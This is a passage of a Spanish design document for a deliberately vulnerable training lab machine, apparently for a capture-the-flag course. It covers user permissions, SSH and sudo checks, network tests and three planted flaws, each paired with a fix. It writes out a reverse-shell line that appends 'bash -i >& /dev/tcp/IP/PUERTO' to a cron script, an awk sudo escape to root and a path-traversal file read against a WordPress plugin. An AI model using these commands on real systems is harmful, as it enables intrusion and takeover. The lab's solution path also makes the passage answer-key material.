- Qué permisos tiene el grupo. El grupo propietario (root) dispone de permisos de Lectura y Acceso/Ejecución (r-x / Valor octal 5). Los usuarios que pertenezcan a este grupo pueden visualizar el contenido pero no editarlo de forma directa.
- Qué permisos tienen los demás usuarios. Los demás usuarios tienen permisos de Lectura y Acceso (r-x / Valor octal 5) y sobre el archivo del script interno (Vector del Reto), los demás usuarios poseen permisos deliberados de Lectura, Escritura y Ejecución (rwx / Valor octal 7 o 6). Esto constituye la vulnerabilidad de diseño del laboratorio.
- Qué usuarios pueden leer, escribir o acceder.
  - Lectura y Acceso: Todos los usuarios del sistema (root, clara_immerwahr y el usuario de entrada haber_fritz) pueden acceder al directorio, listar su contenido y leer las líneas de código del script. Esto permite al alumno inspeccionar el entorno durante la fase de reconocimiento.

  - Escritura (Modificación): Debido a los permisos laxos aplicados sobre el archivo del script, el usuario de entrada haber_fritz puede escribir y modificar su contenido. Esto le permite inyectar comandos maliciosos (como una reverse shell).

  - Ejecución: El script es ejecutado de forma automática por la tarea programada (cronjob) bajo el contexto de la usuaria intermedia clara_immerwahr. Al procesarse con su identidad, cualquier comando inyectado por haber_fritz se ejecutará con los privilegios de Clara, materializando con éxito el movimiento lateral.

### 5.4. Verificación del acceso

#### Usuario autorizado (root)

```bash
root@ammonia:/home/haber_fritz# gpasswd -d haber_fritz sudo
Removing user haber_fritz from group sudo
```

#### Usuarios no autorizados (haber_fritz y clara_immerwahr)

```bash
haber_fritz@ammonia:~$ sudo su
[sudo] password for haber_fritz:
haber_fritz is not in the sudoers file.  This incident will be reported.

clara_immerwahr@ammonia:/home/haber_fritz$ sudo su
[sudo] password for clara_immerwahr:
Sorry, user clara_immerwahr is not allowed to execute '/usr/bin/su' as root on ammonia.
clara_immerwahr@ammonia:/home/haber_fritz$ sudo -l
Matching Defaults entries for clara_immerwahr on ammonia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User clara_immerwahr may run the following commands on ammonia:
    (ALL) NOPASSWD: /usr/bin/awk
```
    
### 5.5. Acceso local y remoto

1. Qué usuario puede conectarse
El único usuario habilitado para realizar la conexión e intrusión inicial al entorno local del laboratorio es haber_fritz.

  - Nota de seguridad: Los usuarios de servicio (como www-data) carecen de shell interactiva (nologin), y el acceso directo al superusuario (root) a través de la red perimetral se encuentra estrictamente deshabilitado por política de hardening (endurecimiento del servidor).

2. Qué mecanismo de autenticación utiliza
El acceso se realiza de forma remota a través del protocolo SSH (Secure Shell) en el puerto configurado del servidor ammonia. El mecanismo de autenticación empleado depende del despliegue específico del escenario:

  - Autenticación por contraseña tradicional: El alumno debe validar las credenciales preestablecidas de haber_fritz obtenidas en la fase previa.

  - Alternativa de diseño: Si el reto simula un escenario de clave comprometida, se utiliza la autenticación basada en Llaves Asimétricas SSH (Clave Privada id_rsa).

3. A qué recursos puede acceder
Una vez autenticado, el usuario haber_fritz se encuentra en un entorno restringido de usuario raso, pero tiene visibilidad sobre los siguientes recursos:

  - Su directorio personal (/home/haber_fritz), donde aloja flags locales o pistas de la auditoría.

  - Permisos de lectura global (r-x) sobre directorios comunes del sistema, lo que le permite inspeccionar la carpeta de scripts (/opt/scripts/) y descubrir el archivo laxo.

  - Permisos de lectura y ejecución (r-x) sobre los archivos de configuración perimetrales y de WordPress en /var/www/html.

4. Qué riesgo supondría permitir accesos innecesarios
Permitir privilegios excesivos o accesos no controlados en este punto rompería por completo el propósito formativo del reto y degradaría la seguridad del servidor debido a los siguientes riesgos:

  - Destrucción de la cadena de explotación (Atajos/Trampas): Si el usuario haber_fritz hubiese mantenido su pertenencia al grupo sudo, el alumno habría escalado a root de forma inmediata ejecutando un simple sudo su, ignorando por completo la investigación del script de la tarea programada (Cron) y la explotación del binario awk de Clara.

  - Movimientos laterales descontrolados: Si haber_fritz tuviese acceso de escritura en directorios raíz (/etc, /var), un atacante real (o el alumno) podría alterar la persistencia del servidor, cambiar contraseñas de otros usuarios del reto o corromper los servicios web legítimos.

  - Falta de principio de menor privilegio: Mantener accesos innecesarios expande la superficie de ataque lúdica del laboratorio, transformando un reto de ingenio y pivoting técnico en una escalada trivial.

```bash
root@ammonia:/home/haber_fritz# sudo systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2026-07-18 17:20:57 UTC; 1h 26min ago
       Docs: man:sshd(8)
             man:sshd_config(5)
   Main PID: 917 (sshd)
      Tasks: 1 (limit: 2172)
     Memory: 5.5M
        CPU: 78ms
     CGroup: /system.slice/ssh.service
             └─917 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

Jul 18 17:20:56 ammonia systemd[1]: Starting OpenBSD Secure Shell server...
Jul 18 17:20:57 ammonia sshd[917]: Server listening on 0.0.0.0 port 22.
Jul 18 17:20:57 ammonia sshd[917]: Server listening on :: port 22.
Jul 18 17:20:57 ammonia systemd[1]: Started OpenBSD Secure Shell server.
Jul 18 17:26:11 ammonia sshd[13066]: Accepted password for haber_fritz from 192.168.1.101 port 58559 ssh2
Jul 18 17:26:11 ammonia sshd[13066]: pam_unix(sshd:session): session opened for user haber_fritz(uid=1000) by (uid=0)
Jul 18 18:23:27 ammonia sshd[13805]: Accepted password for haber_fritz from 192.168.1.101 port 51300 ssh2
Jul 18 18:23:27 ammonia sshd[13805]: pam_unix(sshd:session): session opened for user haber_fritz(uid=1000) by (uid=0)

root@ammonia:/home/haber_fritz# ss -tulnp | grep :22
tcp   LISTEN 0      128                             0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=917,fd=3))      
tcp   LISTEN 0      128                                [::]:22           [::]:*    users:(("sshd",pid=917,fd=4)) 
```

```bash
C:\Users\XPC>ssh haber_fritz@192.168.1.103
haber_fritz@192.168.1.103's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-185-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 18 06:23:27 PM UTC 2026

  System load:  0.0                Processes:              220
  Usage of /:   54.7% of 11.21GB   Users logged in:        1
  Memory usage: 25%                IPv4 address for ens33: 192.168.1.103
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

8 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

New release '24.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Sat Jul 18 17:26:11 2026 from 192.168.1.101
                     (●) (●)
                      \   /
                     .-----.
                    /   N   \
                    \       /
                     '-----'
                     /  |  \
                    /   |   \
                   /    |    \
                .-.     |     .-.
               ( H )    |    ( H )
                '-'    .-.    '-'
                      ( H )
                       '-'
haber_fritz@ammonia:~$
```

### 5.6. Privilegios administrativos

#### haber_fritz

```bash
haber_fritz@ammonia:~$ sudo -l
[sudo] password for haber_fritz:
Sorry, user haber_fritz may not run sudo on ammonia.
```
#### clara_immerwahr

```bash
clara_immerwahr@ammonia:/$ sudo -l
Matching Defaults entries for clara_immerwahr on ammonia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User clara_immerwahr may run the following commands on ammonia:
    (ALL) NOPASSWD: /usr/bin/awk
```
1. Qué comandos puede ejecutar cada usuario
  - haber_fritz: No tiene permitido ejecutar ningún comando con privilegios de superusuario. El sistema deniega explícitamente su interacción con el binario sudo.

  - clara_immerwahr: Tiene autorización exclusiva para ejecutar el binario /usr/bin/awk con los privilegios de cualquier usuario del sistema (ALL), incluyendo a root.

2. Si necesita contraseña
  - haber_fritz: No aplica (acceso prohibido).

  - clara_immerwahr: No necesita contraseña (NOPASSWD). Puede invocar la herramienta de procesamiento de texto awk de manera inmediata sin que el sistema valide su identidad mediante un prompt de credenciales.

3. Si los permisos son adecuados o inseguros
  - La configuración de haber_fritz es adecuada y segura, ya que garantiza el principio de menor privilegio para la cuenta de entrada al laboratorio.

  - La configuración de clara_immerwahr es críticamente insegura en un entorno de producción real, pero está diseñada de forma excelente para el propósito del reto. awk posee directivas internas (como system()) que permiten interactuar de forma nativa con el sistema operativo subyacente.

4. Si forman parte de la escalada de privilegios:
Esto constituye el vector definitivo de escalada de privilegios vertical (Salto a Root).
Al tener acceso irrestricto a /usr/bin/awk sin contraseña, el alumno (tras haber tomado control de la cuenta de Clara) puede explotar la debilidad del binario para forzar la apertura de una shell interactiva que heredará automáticamente el UID de la identidad ejecutora (root). La línea de explotación exacta que completará el reto es: `sudo awk 'BEGIN {system("/bin/bash")}'`

5. Cómo deberían corregirse:
Para mitigar esta vulnerabilidad en un entorno empresarial y securizar por completo la directiva, se deberían aplicar las siguientes contramedidas de hardening:

  - Eliminar la directiva NOPASSWD: Forzar siempre la re-autenticación del usuario para mitigar ataques basados en el secuestro de sesiones o movimientos laterales automáticos.

  - Restringir los binarios peligrosos: Sustituir o suprimir la regla del archivo /etc/sudoers que delega el uso de aplicaciones con capacidad de evasión (GTFOBins). Si un usuario requiere procesar texto, se deben delegar scripts o herramientas específicas cerradas que no permitan la ejecución de comandos de sistema (system()).

### 5.7. Relación con la vulnerabilidad

El diseño de la máquina vulnerable ammonia no depende de un exploit de software desactualizado, sino de un encadenamiento de malas configuraciones lógicas de permisos (Chain Exploitation). A continuación, se detallan los dos vectores que articulan el reto.

#### Vector 1: Movimiento Lateral (De haber_fritz a clara_immerwahr)
1. Qué usuario o recurso está afectado: 
El recurso afectado es el script de automatización alojado en /opt/scripts/backup.sh (o equivalente), el cual es ejecutado periódicamente por una tarea programada (Cronjob) bajo el contexto de seguridad de la usuaria clara_immerwahr.

2. Qué permiso se ha configurado incorrectamente: 
Se ha aplicado un bit de permisos global laxo -rwxrwxrwx (777) sobre el archivo del script. Esto otorga privilegios de escritura a cualquier usuario del sistema (Others), rompiendo el aislamiento entre cuentas.

3. Cómo puede aprovecharse: 
El alumno, tras acceder como el usuario inicial haber_fritz, inspecciona el script y detecta que puede editarlo. Aprovechando esto, inyecta una línea de código (como una reverse shell o una copia de /bin/bash con permisos especiales) dentro del archivo: `echo "bash -i >& /dev/tcp/IP_AUDITOR/PUERTO 0>&1" >> /opt/scripts/backup.sh`. Al cabo de un minuto, el demonio cron ejecuta de forma automática el script modificado con la identidad de clara_immerwahr, otorgando al auditor una consola con los privilegios de esta usuaria.

4. Qué impacto tiene: 
Pivoting / Movimiento lateral exitoso que permite evadir el entorno restringido de haber_fritz y suplantar la identidad de una usuaria con mayores prerrogativas en el sistema sin necesidad de conocer su contraseña.

5. Cómo se corregiría: Se debe aplicar el principio de menor privilegio sobre el archivo del script, restringiendo la escritura únicamente al propietario legítimo o al administrador:

```bash
sudo chmod 755 /opt/scripts/backup.sh
sudo chown root:root /opt/scripts/backup.sh
```

#### Vector 2: Escalada de Privilegios Vertical (De clara_immerwahr a root)

1. Qué usuario o recurso está afectado:
La directiva de privilegios del archivo de configuración de sudoers (/etc/sudoers) asociada a la usuaria clara_immerwahr.

2. Qué permiso se ha configurado incorrectamente:
Se ha configurado una regla de ejecución delegada extremadamente permisiva y sin validación de credenciales: `clara_immerwahr ALL=(ALL) NOPASSWD: /usr/bin/awk`

3. Cómo puede aprovecharse: 
Al tomar control de la cuenta de Clara, el auditor ejecuta sudo -l y descubre la regla. Dado que awk pertenece a la categoría de binarios con capacidad de evasión de seguridad (GTFOBins), el auditor aprovecha su funcionalidad nativa para invocar comandos del sistema y spawnear una consola como superusuario: `sudo awk 'BEGIN {system("/bin/bash")}'`

4. Qué impacto tiene: 
Compromiso total del sistema (Escalada Vertical): El atacante obtiene acceso como root (UID 0), logrando el control absoluto sobre el servidor ammonia, pudiendo leer cualquier flag residual, alterar el sistema de archivos o persistir indefinidamente.

5. Cómo se corregiría: 
Sustituir el binario genérico por un script restringido en los sudoers o eliminar la regla por completo si no es estrictamente necesaria. En caso de requerirse, se debe exigir siempre la contraseña quitando el flag NOPASSWD y asegurar que el binario no pueda realizar llamadas al sistema (system): `clara_immerwahr ALL=(ALL) /usr/bin/custom_filter_script`

### 5.8. Comprobación final

| Comprobación | Comando o evidencia | Resultado | Cumple | Acción correctiva |
|--------------|---------------------|-----------|--------|-------------------|
| Usuario autorizado | `id clara_immerwahr` | uid=1001(clara_immerwahr) gid=1001... Identidad operativa para el movimiento lateral. | Sí | No necesaria. |
| Usuario no autorizado | `id haber_fritz` | uid=1000(haber_fritz)... Operando como usuario raso de entrada al laboratorio. | Sí | No necesaria. |
| Aislamiento del Servicio | `id www-data` | uid=33(www-data). Correctamente aislado del filtrado de shells activas (nologin). | Sí | No necesaria. |
| Permisos de Directorios | `ls -ld /opt/scripts` | drwxr-xr-x (755) bajo la propiedad estricta de root:root. | Sí | No necesaria. |
| Evidencia de Vulnerabilidad | `ls -l /opt/scripts/backup.sh` | -rwxrwxrwx (777). Fichero interno modificable por others (vía para el reto). | Sí | No necesaria. |
| Acceso SSH | Conexión remota local | Correcta. El usuario haber_fritz puede autenticarse de forma interactiva por consola. | Sí | No necesaria. |
| Privilegios (Entrada) | `haber_fritz@ammonia:~$ sudo -l` | Denegado. haber_fritz is not in the sudoers file. Degradación y blindaje completados con éxito. | Sí | No necesaria. |
| Privilegios (Escalada) | `clara_immerwahr@ammonia:/$ sudo -l` | Documentados. Acceso específico a (ALL) NOPASSWD: /usr/bin/awk (vector final a Root). | Sí | No necesaria. |

---
---

## 6. Evaluación de servicios de comunicaciones

### 6.1. Configuración de red

Hay que tener en cuenta que la IP de la red variará dependiendo de la red en la que se encuentre, está prueba se hizo usando la conexión bridged, de manera nativa se encuentra en NAT

```bash
clara_immerwahr@ammonia:/$ ip -br address
lo               UNKNOWN        127.0.0.1/8 ::1/128
ens33            UP             192.168.1.103/24 metric 100 fe80::20c:29ff:fe54:a8c3/64
clara_immerwahr@ammonia:/$ ip route
default via 192.168.1.1 dev ens33 proto dhcp src 192.168.1.103 metric 100
80.58.61.250 via 192.168.1.1 dev ens33 proto dhcp src 192.168.1.103 metric 100
80.58.61.254 via 192.168.1.1 dev ens33 proto dhcp src 192.168.1.103 metric 100
192.168.1.0/24 dev ens33 proto kernel scope link src 192.168.1.103 metric 100
192.168.1.1 dev ens33 proto dhcp scope link src 192.168.1.103 metric 100
clara_immerwahr@ammonia:/$ ip -s link
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    RX:  bytes packets errors dropped  missed   mcast
         10112     120      0       0       0       0
    TX:  bytes packets errors dropped carrier collsns
         10112     120      0       0       0       0
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 00:0c:29:54:a8:c3 brd ff:ff:ff:ff:ff:ff
    RX:  bytes packets errors dropped  missed   mcast
       2450457    6353      0     111       0       0
    TX:  bytes packets errors dropped carrier collsns
        435734    2268      0       0       0       0
    altname enp2s1
```
1. Qué interfaz está activa:
El sistema operativo cuenta con dos interfaces lógicas. La interfaz de bucle local (lo) para comunicaciones internas, y la interfaz física principal ens33, la cual se encuentra en estado UP (activa y operativa).

2. Qué dirección IP utiliza: 
La interfaz principal ens33 tiene asignada la dirección IPv4 privada 192.168.1.103 asignada dinámicamente mediante el protocolo DHCP (proto dhcp).

3. Qué máscara de red tiene: 
La máscara de red está definida por la notación CIDR /24, lo que equivale a una máscara de subred de clase C tradicional: 255.255.255.0. Esto indica que el segmento local de red abarca desde la dirección 192.168.1.1 hasta la 192.168.1.254.

4. Qué puerta de enlace utiliza: 
La puerta de enlace predeterminada (Default Gateway) es 192.168.1.1 (default via 192.168.1.1). Toda petición que vaya dirigida hacia el exterior o internet se enruta de forma obligatoria a través de este dispositivo.

5. Qué modo de red se ha configurado en VMware: 
El hipervisor VMware está configurado en modo Adaptador de puente (Bridged). Esto se evidencia de forma inequívoca debido a dos factores:

  - La máquina ha obtenido una IP del rango doméstico estándar (192.168.1.X), actuando como un host físico más dentro de la red local.

  - La tabla de rutas ha mapeado de forma automática servidores DNS externos (80.58.61.250 y .254), típicos del proveedor de internet físico del entorno (Movistar).
  - Cabe aclarar de nuevo que esta configuración es unicamente para el entorno de producción, la versión de la máquina original presenta una conexión NAT.

6. Si existen errores o paquetes descartados: 
  - Errores: El contador de errores tanto en recepción (RX) como en transmisión (TX) se mantiene en 0, garantizando que la tarjeta de red virtual y el medio físico no sufren de fallos de colisión o corrupción de tramas.

  - Paquetes descartados (Dropped): En el bloque de recepción (RX), se registran 111 paquetes descartados. Este descarte es completamente normal en el modo Bridge, ya que la interfaz recibe tráfico de difusión global de la red física (Broadcast/Multicast de otros equipos de la casa) que el kernel de la máquina virtual decide ignorar de forma segura al no ir dirigidos específicamente a su IP.

### 6.2. Identificación de puertos y servicios

Ver: - [Write-up de resolución](ruta-explotacion.md)

### 6.3. Prueba de conectividad

```bash
C:\Users\XPC>ping -n 10 192.168.1.103

Haciendo ping a 192.168.1.103 con 32 bytes de datos:
Respuesta desde 192.168.1.103: bytes=32 tiempo=5ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=11ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=16ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=9ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=5ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=11ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=4ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=7ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=4ms TTL=64
Respuesta desde 192.168.1.103: bytes=32 tiempo=7ms TTL=64

Estadísticas de ping para 192.168.1.103:
    Paquetes: enviados = 10, recibidos = 10, perdidos = 0
    (0% perdidos),
Tiempos aproximados de ida y vuelta en milisegundos:
    Mínimo = 4ms, Máximo = 16ms, Media = 7ms
```
- Se enviaron 10 paquetes
- Se recibieron 10 paquetes
- No existe perdida de paquetes
- Latencia media de 7ms
- Se cumple con el plan de explotación

### 6.4. Tiempo de respuesta

```bash
C:\Users\XPC>curl -o /dev/null -s -w "Codigo HTTP: %{http_code}\nTiempo total: %{time_total}s\n" http://192.168.1.103:7664/
Codigo HTTP: 200
Tiempo total: 1.072602s
```
- Código HTTP: 200
- Cuánto tardó en responder: 1.072602s
- Cumple con el límite establecido
- Qué causas podrían provocar una respuesta lenta: Escaneos masivos y cargas elevadas en la base de datos, entre otras.

### 6.5. Disponibilidad de los servicios

```bash
clara_immerwahr@ammonia:/$ systemctl is-active ssh
active
clara_immerwahr@ammonia:/$ systemctl is-active lighttpd
active
```

### 6.6. Incidencia controlada y recuperación

Ver ejemplo del apartado 3.2

- Qué servicio se detuvo: Se detuvo el demonio encargado de la ejecución de tareas programadas del sistema operativo (cron.service).

- Cómo se detectó la interrupción: Se detectó inspeccionando el estado del servicio mediante systemctl status, el cual cambió de active (running) a inactive (dead).

- Qué ocurrió con la comunicación: Se interrumpió la comunicación interna y el flujo temporal; la ejecución del script por minuto se congeló por completo.

- Qué información apareció en los registros: Los registros confirmaron el cierre seguro mediante las trazas Stopping..., Deactivated successfully y Stopped.

- Cómo se recuperó el servicio: El servicio se restableció manualmente en caliente ejecutando el comando de inicialización sudo systemctl start cron.

- Si vuelve a cumplir el plan de explotación: Sí, la reactivación del servicio vuelve a habilitar el vector de movimiento lateral automático hacia la cuenta de Clara.

### 6.7. Comprobación final

| Parámetro | Comando o evidencia | Resultado | Cumple | Acción correctiva |
|-----------|---------------------|-----------|--------|-------------------|
| Interfaz activa | `ip -br address` | Interfaz ens33 en estado UP con la IP privada 192.168.1.103/24. | Sí | No necesaria. |
| Puertos declarados | `ss -tlnp` (en máquina) | El servicio web opera correctamente en el puerto personalizado 7664 en lugar del 80. | Sí | No necesaria. |
| Pérdida de paquetes | `ip -s link` | 0 % de errores en hardware virtual. Los 111 descartes en RX son normales por el modo Bridge. | Sí | No necesaria. |
| Tiempo de respuesta | `curl` (desde Windows) | 1.07 segundos con código HTTP 200. Rendimiento óptimo para el procesamiento dinámico de WordPress. | Sí | No necesaria. |
| Servicio SSH | `systemctl is-active ssh` | Activo. Permite la intrusión inicial controlada del alumno mediante el usuario haber_fritz. | Sí | No necesaria. |
| Recuperación | `systemctl start cron` | Correcta. El demonio de tareas programadas se levantó tras su parada, restaurando el vector de ataque. | Sí | No necesaria. |

---
---

## 7. Vulnerabilidades implementadas

### 7.1. Vulnerabilidad de Acceso Inicial: Plugin Vulnerable (Mail Masta - LFI) (CVE-2016-10956)

- Activo afectado: ((WB-1)) Blog (WordPress) / ((MD-2)) lighttpd (Puerto 7664).

- Configuración que  la provoca: La instalación y activación del plugin desactualizado Mail Masta (versión 1.0), el cual carece de sanitización en sus parámetros de entrada (específicamente en variables de inclusión de archivos).

- Riesgo que  representa: Permite a un atacante no autenticado evadir los controles de acceso a archivos del servidor web y leer archivos arbitrarios internos del sistema operativo (Local File Inclusion).

- Cómo puede explotarse: Mediante el envío de una petición HTTP manipulada que utilice secuencias de salto de directorio (../../../../etc/passwd) a través del parámetro vulnerable del plugin para forzar al servidor a renderizar el contenido de archivos locales del sistema de archivos, tales como /etc/passwd o wp-config.php.

- Impacto: Crítico. Fuga de información confidencial y exposición de las credenciales de texto plano de la base de datos de WordPress, las cuales se reutilizan en el servicio SSH.

- Cómo se corregiría en un sistema real: Desinstalar de inmediato el plugin Mail Masta o actualizarlo a una versión parcheada que sanitice las entradas del usuario. Implementar directivas estrictas en la configuración de PHP (allow_url_fopen = Off y allow_url_include = Off).

### 7.2. Escalada de Privilegios (Movimiento Lateral): Tarea Cron Modificable

- Activo afectado: ((AC-1)) Usuarios y Archivos / Script de mantenimiento /opt/scripts/backup_notes.sh.

- Configuración que  la provoca: Una asignación laxa e incorrecta de privilegios en el sistema de archivos (chmod 777) sobre el script de copia de seguridad, sumado a una tarea programada en el archivo general /etc/crontab que ejecuta dicho script cada minuto bajo el contexto del usuario clara_immerwahr.

- Riesgo que  representa: Permite la inyección y ejecución de código arbitrario. Cualquier usuario con acceso local de bajos privilegios puede modificar el comportamiento del script.

- Cómo puede explotarse: El usuario inicial haber_fritz concatena una línea de comandos al final del archivo aprovechando su permiso de escritura (echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" >> /opt/scripts/backup_notes.sh). Al cumplirse el minuto, el demonio Cron procesa el archivo e inicia una conexión inversa automatizada.

- Impacto: Alto. Suplantación y toma de control horizontal de la identidad de la usuaria intermedia clara_immerwahr, obteniendo acceso directo a sus documentos e historial.

- Cómo se corregiría en un sistema real: Aplicar el principio de mínimo privilegio sobre el archivo de mantenimiento, eliminando el permiso de escritura para el resto de usuarios del sistema mediante el comando chmod 755 /opt/scripts/backup_notes.sh o asignando la propiedad estricta a su ejecutor legítimo.

### 7.3. Escalada de Privilegios (Máxima): Configuración Insegura de Sudo (awk)

- Activo afectado: ((SO-1)) Ubuntu Server / Reglas de Sudoers.

- Configuración que la provoca: La inclusión de una regla permisiva en el archivo de configuración /etc/sudoers que autoriza explícitamente a la cuenta clara_immerwahr a ejecutar el binario del sistema /usr/bin/awk con privilegios de administrador sin requerir autenticación (NOPASSWD:).

- Riesgo que representa: Evasión total de los controles de restricción de privilegios. El binario permitido cuenta con funciones nativas que permiten invocar intérpretes de comandos secundarios (shells).

- Cómo puede explotarse: Una vez que el auditor se encuentra en la sesión de Clara, invoca el binario abusando de la propiedad de ejecución de comandos interactivos (GTFOBins) mediante la sentencia: sudo awk 'BEGIN {system("/bin/sh")}'.

- Impacto: Crítico. Compromiso total y absoluto del servidor virtual. El auditor obtiene acceso directo como el superusuario root, logrando persistencia, lectura y modificación de cualquier recurso del sistema operativo.

- Cómo se corregiría en un sistema real: Revocar la directiva NOPASSWD para comandos que dispongan de funciones de escape integradas. Si es estrictamente necesario delegar la tarea a awk, estructurar scripts específicos firmados o restringir sus argumentos mediante alias de comandos específicos en /etc/sudoers para evitar la inyección de la función system().

### 7.4. Flags

- usuario #1 (haber_fritz) : aber_fritz@ammonia:~/.secret/backup$ 'Proceso Haber-Bosch para la producción de amoníaco.zip'
- usuario #2 (clara_immerwahr) : /documents/conflicto_etico$ cat .clara_ultimas_palabras
- usuario #3 (root.txt) : root@ammonia:/# unzip -p sintesis_catalitica_amonio.zip

---
---

## 8. Write-up de resolución
- [Write-up de resolución](ruta-explotacion.md)

---
---

## 9. Credenciales white box
- [Credenciales white box](credenciales-white-box.md)



